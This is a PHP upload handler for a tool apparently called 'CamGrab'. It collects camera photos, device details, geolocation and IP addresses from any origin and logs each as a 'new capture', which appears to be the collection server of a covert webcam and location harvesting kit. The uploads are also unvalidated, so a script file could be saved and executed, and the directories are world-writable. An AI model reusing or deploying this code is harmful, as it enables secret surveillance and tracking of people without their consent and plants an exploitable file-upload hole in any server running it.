<?php
// Upload handler for CamGrab
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Create directories if they don't exist
$camshots_dir = 'camshots';
$logs_dir = 'logs';

if (!file_exists($camshots_dir)) {
    mkdir($camshots_dir, 0777, true);
}
if (!file_exists($logs_dir)) {
    mkdir($logs_dir, 0777, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "\n========== NEW CAPTURE ==========\n";
    $log_entry .= "Time: $timestamp\n";
    $log_entry .= "IP: $ip\n";
    
    // Handle photo upload
    if (isset($_FILES['photo'])) {
        $photo = $_FILES['photo'];
        $filename = time() . '_' . basename($photo['name']);
        $target = $camshots_dir . '/' . $filename;
        
        if (move_uploaded_file($photo['tmp_name'], $target)) {
            $log_entry .= "Photo saved: $filename\n";
        }
    }
    
    // Handle device info
    if (isset($_POST['device_info'])) {
        $device_info = json_decode($_POST['device_info'], true);
        $log_entry .= "Device Info:\n";
        foreach ($device_info as $key => $value) {
            $log_entry .= "  $key: $value\n";
        }
        
        // Save detailed device info
        file_put_contents($logs_dir . '/device_' . time() . '.json', $_POST['device_info']);
    }
    
    // Handle location
    if (isset($_POST['location'])) {
        $location = json_decode($_POST['location'], true);
        $log_entry .= "Location:\n";
        foreach ($location as $key => $value) {
            $log_entry .= "  $key: $value\n";
        }
        
        // Save location data
        file_put_contents($logs_dir . '/location_' . time() . '.json', $_POST['location']);
    }
    
    // Save to main log
    file_put_contents($logs_dir . '/capture.log', $log_entry, FILE_APPEND);
    
    http_response_code(200);
    echo json_encode(['status' => 'success']);
} else {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
}
?>
